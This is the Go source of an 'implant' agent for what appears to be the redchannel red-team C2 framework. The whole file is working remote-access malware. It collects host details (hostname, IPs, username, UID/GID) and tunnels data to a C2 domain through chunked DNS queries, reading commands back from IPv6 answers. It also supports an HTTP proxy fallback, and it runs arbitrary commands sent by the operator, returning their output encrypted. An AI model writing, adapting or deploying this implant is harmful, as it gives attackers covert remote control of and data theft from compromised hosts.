package implant

import (
	"context"
	"crypto"
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/user"
	"sort"
	"strings"
	"time"

	"github.com/slackr/redchannel-agent/config"
	"google.golang.org/protobuf/proto"
)

/** String obfuscation from https://github.com/unixpickle/gobfuscate

(func() string {
	s := []byte{0xde, 0xcf, 0xd9, 0xde}
	key := 0xAA
	for i, c := range s {
		s[i] = byte(int(c) ^ key)
	}
	return string(s)
}())
*/

type RecordType int

const (
	DNS_TXT RecordType = 0x00
	DNS_A   RecordType = 0x01
)

const AGENT_ID_LEN = 8

const SENDQ_CHUNK_LEN = 32
const DATA_ID_LEN = 4
const DATA_PAD_CHAR = "f"

const AES_GCM_NONCE_LEN = 12
const AES_BLOCK_LEN = 16

const IP_HEADER_PREFIX = "ff00"
const IP_DATA_PREFIX = "2001"

const PROXY_DATA_SEPARATOR = ";"

type QueueMessage string
type DataId string
type ChunkMap map[int][]byte

// Agent class holds all agent data, including sendq and recvq, passwords, id, crypto object
type Agent struct {
	privkey  crypto.PrivateKey
	pubkey   crypto.PublicKey
	resolver *net.Resolver
	id       string
	password string
	crypto   Crypto
	sendq    map[QueueMessage]AgentCommand // map["010FF.chunk"] = 0xff
	recvq    map[DataId]ChunkMap           // map[dataId] = [0 = chunk1, 1 = chunk2]
	sentKey  bool
	config   config.Config
	shutdown bool
}

// Init will initialize the agent, generate a new agent ID and new keys
func (a *Agent) Init() {
	a.config = config.Config{}
	a.config.Init()

	a.shutdown = false

	a.crypto = Crypto{}

	a.sendq = make(map[QueueMessage]AgentCommand)
	a.recvq = make(map[DataId]ChunkMap)

	a.NewAgentID()
	a.NewKeys()
}

func (a *Agent) GetC2Interval() int {
	return a.config.C2Interval
}
func (a *Agent) IsShutdown() bool {
	return a.shutdown
}

// NewKeys is a wrapper for Crypto.GenerateKeys()
func (a *Agent) NewKeys() {
	a.crypto.GenerateKeys()
}

// CheckIn queues up a CHECKIN command with dummy data
func (a *Agent) CheckIn() {
	if a.config.ProxyEnabled == true {
		var proxyData = a.GetFromProxy()
		if len(proxyData) > 0 {
			a.ProcessResponse(proxyData)
		} else {
			log.Printf("no data from proxy c2\n")
		}
	}

	if !a.IsCommandInSendQ(AgentCommand_AGENT_COMMAND_CHECKIN) && !a.IsCommandInSendQ(AgentCommand_AGENT_COMMAND_KEYX) {
		// if we don't have a computed secret yet, we will send dummy data with our checkin
		// this will be our first ping if the c2 doesn't know about us yet.
		// c2 may error out trying to decrypt the dummy payload if an agent is already checked in
		// the operator may choose to delete the agent and allow first ping again
		if a.crypto.secret == nil {
			log.Printf("checking in with dummy data (no secret computed yet)\n")
			a.CleanupSendQ(AgentCommand_AGENT_COMMAND_CHECKIN)
			agentId, err := hex.DecodeString(a.id)
			if err != nil {
				log.Printf("error checking in with agent id\n")
				return
			}
			a.QueueData(AgentCommand_AGENT_COMMAND_CHECKIN, agentId)
			return
		}

		log.Printf("checking in with encrypted data\n")
		a.SendEncrypted(a.crypto.RandomBytes(6), AgentCommand_AGENT_COMMAND_CHECKIN)
	}
}

// SendEncrypted will encrypt a message byte array and add it to the sendq
func (a *Agent) SendEncrypted(message []byte, command AgentCommand) {
	if a.crypto.secret == nil {
		log.Printf("error cannot send encrypted, start keyx first\n")
		return
	}

	var data []byte
	if command == AgentCommand_AGENT_COMMAND_KEYX {
		data = message
	} else {
		commandResponse := &CommandResponse{}
		commandResponse.Command = AgentCommand_AGENT_COMMAND_KEYX
		commandResponse.Data = message
		commandResponse.Status = AgentCommandStatus_AGENT_COMMAND_STATUS_SUCCESS
		commandResponseProto, marshalError := proto.Marshal(commandResponse)
		if marshalError != nil {
			log.Printf("failed marshal command response: %x (err: %q)\n", commandResponse, marshalError)
			return
		}
		data = commandResponseProto
	}

	ciphertext, err := a.crypto.EncryptAesCbc(data, a.crypto.secret)
	if err != nil {
		log.Printf("error encrypting message: %q (err: %q)\n", message, err)
		return
	}

	a.QueueData(command, ciphertext)
}

// Keyx will send the hex string crypto pubkey using QueueData
// The sendq will be wiped of any pending keyx commands
func (a *Agent) Keyx() {
	if a.crypto.pubkey == nil {
		a.NewKeys()
	}

	a.CleanupSendQ(AgentCommand_AGENT_COMMAND_KEYX)
	a.QueueData(AgentCommand_AGENT_COMMAND_KEYX, a.crypto.pubkey)
}

// QueueData queues up the data string as DNS queries to be
// made by ProcessSendQ
func (a *Agent) QueueData(command AgentCommand, bytes []byte) {
	data := BytesToHexString(bytes)

	chunks := SplitStringIntoChunks(data, SENDQ_CHUNK_LEN)
	totalChunks := len(chunks)

	// unique-ish identifier for each sent command to aide in reconstruction
	dataId := a.crypto.RandomHexString(DATA_ID_LEN)

	for chunkNumber, chunkData := range chunks {
		// [agentId].[dataId][agent_command].[chunk_num][chunk_total].[chunk].c2.domain.tld
		queueMessage := QueueMessage(fmt.Sprintf("%s.%s%02x.%02x%02x.%s", a.id, dataId, command.Number(), chunkNumber, totalChunks, chunkData))
		// TODO: need a better structure
		a.sendq[queueMessage] = command
	}
}

// Run executes the functions required by the main loop
func (a *Agent) Run() {
	a.ProcessSendQ()
	a.CheckIn()
}

// CleanupSendQ removes specified AgentCommand queue items
func (a *Agent) CleanupSendQ(cleanupCommand AgentCommand) {
	for item, command := range a.sendq {
		if command == cleanupCommand {
			log.Printf("removed from sendq: %q\n", item)
			delete(a.sendq, item)
		}
	}
}

// CleanupSendQ removes specified AgentCommand queue items
func (a *Agent) IsCommandInSendQ(findCommand AgentCommand) bool {
	for _, command := range a.sendq {
		if command == findCommand {
			return true
		}
	}
	return false
}

func (a *Agent) ProcessSendQProxy() {
	var data []string

	var commandsSent []AgentCommand
	for item, command := range a.sendq {
		antiCacheValue := a.crypto.RandomHexString(4)
		segment := antiCacheValue + "." + string(item)
		data = append(data, segment)
		commandsSent = append(commandsSent, command)
	}
	if len(data) > 0 {
		a.SendToProxy(data)
		for i := range commandsSent {
			a.CleanupSendQ(commandsSent[i])
		}
	}
	return
}

// ProcessSendQ is called by agent loop to send data back to c2
func (a *Agent) ProcessSendQ() {
	if a.config.ProxyEnabled == true {
		a.ProcessSendQProxy()
		return
	}

	for sendQItem := range a.sendq {
		// first 2 bytes will be randomized for every request to prevent dns caching
		antiCacheValue := a.crypto.RandomHexString(4)
		query := antiCacheValue + "." + string(sendQItem) + "." + a.config.C2Domain

		resolver := &net.Resolver{
			// cgo does not return IPv6 addresses for some reason
			PreferGo: true,
			Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
				d := net.Dialer{
					Timeout: time.Millisecond * time.Duration(10000),
				}
				return d.DialContext(ctx, network, a.config.Resolver)
			},
		}

		hostIps, err := resolver.LookupHost(context.Background(), query)
		// ips, err := net.LookupHost(query)
		if err != nil {
			log.Printf("error resolving %s: %s\n", query, hostIps)
			return
		}

		var dataIps []string
		for _, ip := range hostIps {
			if strings.HasPrefix(ip, IP_HEADER_PREFIX) || strings.HasPrefix(ip, IP_DATA_PREFIX) {
				dataIps = append(dataIps, ip)
			}
		}

		if len(dataIps) > 0 {
			log.Printf("c2 response for %s: %s\n", query, dataIps)
			delete(a.sendq, sendQItem)
			a.ProcessResponse(dataIps)
		} else {
			log.Printf("no valid data ips in c2 response for: %s, %s\n", query, hostIps)
		}

		// only one SendQ item at a time if throttled
		if a.config.ThrottleSendQ {
			return
		}
	}
}

/**
 * ProcessResponse queues up data to send when agent checks in next
 * 2001:[record_num]:[4 byte data]:...
 *
 * first IP in each command must be the data identifier for agent to track
 * ff00:[data_id]:[command][padded_bytes_count]:[total_records]:[4 byte reserved data]:...
 *
 * old data should be purged when new data comes in for a command
 */
func (a *Agent) ProcessResponse(response []string) {
	var err error
	command := 0
	totalIps := 0
	paddedBytesCount := 0
	var dataId string

	headerFound := false

	// look for the header because records may not be in order
	headerIndex := 0
	for i := range response {
		if strings.HasPrefix(response[i], IP_HEADER_PREFIX) == true {
			headerFound = true
			headerIndex = i

			ipv6 := net.ParseIP(response[i])
			if ipv6 == nil {
				log.Printf("error parsing ipv6 in c2 response: %q, invalid ip\n", response[i])
				return
			}
			expandedIpv6 := ExpandIPv6(ipv6)
			blocks := strings.Split(expandedIpv6, ":")

			command, err = HexBytesToInt(blocks[2][:2])
			if err != nil {
				log.Printf("error decoding command from c2 response: %q, (err: %q)\n", response[i], err)
				return
			}

			if AgentCommand(command) == AgentCommand_AGENT_COMMAND_IGNORE {
				responseStatus, err := HexBytesToInt(blocks[len(blocks)-1])
				if err != nil {
					log.Printf("error decoding status from c2 response: %q, (err: %q)\n", response[i], err)
					return
				}
				log.Printf("c2 status code: %s\n", C2ResponseStatus_name[int32(responseStatus)])
				return
			}

			dataId = blocks[1]
			if _, ok := a.recvq[DataId(dataId)]; !ok {
				a.recvq[DataId(dataId)] = map[int][]byte{}
			}

			paddedBytesCount, err = HexBytesToInt(blocks[2][2:4])
			if err != nil {
				log.Printf("error decoding padded bytes count from c2 response: %q, (err: %q)\n", response[i], err)
				return
			}
			totalIps, err = HexBytesToInt(blocks[3])
			if err != nil {
				log.Printf("error decoding total records from c2 response: %q, (err: %q)\n", response[i], err)
				return
			}
		}
	}

	if !headerFound {
		log.Printf("error, no header found in c2 response: %q\n", response)
		return
	}

	// remove the header
	finalResponse := append(response[:headerIndex], response[headerIndex+1:]...)

	for ipNum := range finalResponse {
		// this does not appear to be a valid data ipv6 address
		if len(finalResponse[ipNum]) < 10 {
			continue
		}
		ipv6 := net.ParseIP(finalResponse[ipNum])
		if ipv6 == nil {
			log.Printf("error parsing ipv6 in c2 response: %q, invalid ip\n", finalResponse[ipNum])
			return
		}
		expandedIpv6 := ExpandIPv6(ipv6)

		blocks := strings.Split(expandedIpv6, ":")

		recordNumber, err := HexBytesToInt(blocks[1])
		if err != nil {
			log.Printf("error decoding record num from c2 response: %q, (err: %q)\n", finalResponse[ipNum], err)
			return
		}
		dataString := strings.Join(blocks[2:], "")
		data, err := HexStringToBytes(dataString)
		if err != nil {
			log.Printf("error decoding data from c2 response: %q, (err: %q)\n", finalResponse[ipNum], err)
			return
		}

		a.recvq[DataId(dataId)][recordNumber] = data

		receivedRecords := len(a.recvq[DataId(dataId)])
		if receivedRecords == totalIps {
			a.ProcessRecvQ(AgentCommand(command), dataId, paddedBytesCount)
		}
		//log.Printf("r %d / %d\n", received_records, total_records)
	}
}

func (a *Agent) ProcessRecvQ(command AgentCommand, dataId string, paddedBytesCount int) {
	sortedRecords := make([]int, len(a.recvq[DataId(dataId)]))
	for recordNumber := range a.recvq[DataId(dataId)] {
		sortedRecords = append(sortedRecords, recordNumber)
	}
	sort.Ints(sortedRecords)

	var data []byte
	for sortedRecordNumber := range sortedRecords {
		for i := range a.recvq[DataId(dataId)][sortedRecordNumber] {
			data = append(data, a.recvq[DataId(dataId)][sortedRecordNumber][i])
		}
	}

	data = data[:len(data)-paddedBytesCount]

	log.Printf("processed recv for command: %s: %x\n", AgentCommand_name[int32(command)], data)
	delete(a.recvq, DataId(dataId))

	// keyx commands are not encrypted
	if command == AgentCommand_AGENT_COMMAND_KEYX {
		commandRequest, unmarshalError := unmarshalCommandRequest(data)
		if unmarshalError != nil {
			log.Printf("failed unmarshal command request: %x (err: %q)\n", data, unmarshalError)
			return
		}

		err := a.crypto.ComputeSharedSecret(commandRequest.Data, a.config.C2Password)
		if err != nil {
			log.Printf("failed to compute secret with pubkey: %x (err: %q)\n", data, err)
			return
		}
		a.Keyx()
		return
	}

	decryptedData, err := a.crypto.DecryptAesCbc(data, a.crypto.secret)
	if err != nil {
		log.Printf("error decrypting data for command %s: %x (err: %q)\n", AgentCommand_name[int32(command)], data, err)
		return
	}

	commandRequest, unmarshalError := unmarshalCommandRequest(decryptedData)
	if unmarshalError != nil {
		log.Printf("failed unmarshal command request: %x (err: %q)\n", data, unmarshalError)
		return
	}
	decryptedData = commandRequest.Data

	switch command {
	case AgentCommand_AGENT_COMMAND_SYSINFO:
		var sysinfoData = a.GetSysInfo()
		log.Printf("sysinfo: %+v\n", sysinfoData)
		sysinfoProto, marshalError := proto.Marshal(sysinfoData)
		if marshalError != nil {
			log.Printf("failed marshal command response: %x (err: %q)\n", sysinfoData, marshalError)
			return
		}
		a.SendEncrypted([]byte(sysinfoProto), AgentCommand_AGENT_COMMAND_SYSINFO)
		break
	case AgentCommand_AGENT_COMMAND_EXECUTE:
		executeCommand := string(decryptedData)
		commandArguments := strings.Fields(executeCommand)
		go func() {
			out, err := exec.Command(commandArguments[0], commandArguments[1:]...).Output()
			if err != nil {
				log.Printf("error executing: %s (err: %s)\n", executeCommand, err)
				a.SendEncrypted([]byte(err.Error()), AgentCommand_AGENT_COMMAND_MESSAGE)
				return
			}
			log.Printf("executed command: %s output: %s\n", executeCommand, out)
			a.SendEncrypted(out, AgentCommand_AGENT_COMMAND_MESSAGE)
		}()
		break
	case AgentCommand_AGENT_COMMAND_SET_CONFIG:
		newConfig, unmarshalError := unmarshalAgentConfig(decryptedData)
		if unmarshalError != nil {
			log.Printf("failed unmarshal set config proto: %x (err: %q)\n", decryptedData, unmarshalError)
			return
		}

		log.Printf("incoming agent config update: %s\n", decryptedData)
		if newConfig.GetProxyKey() != nil {
			a.config.ProxyKey = newConfig.ProxyKey.Value
		}
		if newConfig.GetProxyUrl() != nil {
			a.config.ProxyUrl = newConfig.ProxyUrl.Value
		}
		if newConfig.GetUseProxyChannel() != nil {
			a.config.ProxyEnabled = newConfig.UseProxyChannel.Value
		}
		if newConfig.GetC2IntervalMs() != nil {
			a.config.C2Interval = int(newConfig.C2IntervalMs.Value)
		}
		if newConfig.GetThrottleSendq() != nil {
			a.config.ThrottleSendQ = newConfig.ThrottleSendq.Value
		}

		log.Printf("updated agent config: %+v\n", a.config)

		break
	case AgentCommand_AGENT_COMMAND_MESSAGE:
		log.Printf("msg> %s\n", decryptedData)
		a.SendEncrypted([]byte("pong!"), AgentCommand_AGENT_COMMAND_MESSAGE)
		break
	case AgentCommand_AGENT_COMMAND_SHUTDOWN:
		log.Printf("shutting down...\n")
		a.SendEncrypted([]byte("shutting down..."), AgentCommand_AGENT_COMMAND_MESSAGE)
		a.ProcessSendQ()
		a.shutdown = true
		break
	}
}

func (a *Agent) SendToProxy(data []string) {
	dataString := strings.Join(data, PROXY_DATA_SEPARATOR) + PROXY_DATA_SEPARATOR
	log.Printf("sending data to proxy: %s\n", dataString)

	formData := url.Values{
		"p": {"a"},
		"k": {a.config.ProxyKey},
		"d": {dataString},
	}

	resp, err := http.PostForm(a.config.ProxyUrl, formData)
	if err != nil {
		log.Printf("could not send to proxy, err: %s\n", err)
		return
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)

	if len(body) > 0 {
		log.Printf("proxy send response: '%s'\n", body)
	}
}
func (a *Agent) GetFromProxy() []string {
	log.Printf("checking in with proxy...\n")

	form_data := url.Values{
		"f": {"c"},
		"k": {a.config.ProxyKey},
		"i": {a.id},
	}

	var data []string
	resp, err := http.PostForm(a.config.ProxyUrl, form_data)
	if err != nil {
		log.Printf("could not read from proxy, err: %s\n", err)
		return data
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)

	// TODO: handle proxy response for OK_NO_DATA
	if len(body) > 0 {
		log.Printf("proxy get response: '%s'\n", string(body))
		data = strings.Split(string(body), PROXY_DATA_SEPARATOR)
	}
	return data
}

// SetDNSResolver attempts to force the process to use a custom resolver for queries
func (a *Agent) SetDNSResolver(nameserver string, port string) {
	if nameserver != "" {
		a.resolver = &net.Resolver{
			PreferGo: true,
			Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
				d := net.Dialer{}
				return d.DialContext(ctx, "udp", net.JoinHostPort(nameserver, port))
			},
		}
	} else {
		a.resolver = net.DefaultResolver
	}
}

// NewAgentID sets that agent ID to a deterministic value
func (a *Agent) NewAgentID() {
	if len(a.id) == 0 {
		var as []string
		ifas, err := net.Interfaces()
		if err == nil {
			for _, ifa := range ifas {
				a := ifa.HardwareAddr.String()
				if a != "" {
					as = append(as, a)
				}
			}
		}

		hostname, err := os.Hostname()
		if err == nil {
			as = append(as, hostname)
		}
		hash := md5.Sum([]byte(strings.Join(as, "")))
		hashString := BytesToHexString(hash[:])

		a.id = hashString[:AGENT_ID_LEN]
	}
}

func (a *Agent) GetSysInfo() *SysInfoData {
	var sysinfo = &SysInfoData{}

	var hostname, err = os.Hostname()
	if err == nil {
		sysinfo.Hostname = hostname
	}

	interfaceAddresses, err := net.InterfaceAddrs()
	if err == nil {
		for _, a := range interfaceAddresses {
			if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if ipnet.IP.To4() != nil {
					ip := ipnet.IP.String()
					if !strings.HasPrefix(ip, "169.254.") {
						sysinfo.Ips = append(sysinfo.Ips, ip)
					}
				}
			}
		}
	}

	currentUser, err := user.Current()
	if err == nil {
		sysinfo.User = currentUser.Username
		sysinfo.Uid = currentUser.Uid
		sysinfo.Gid = currentUser.Gid
	}
	return sysinfo
}
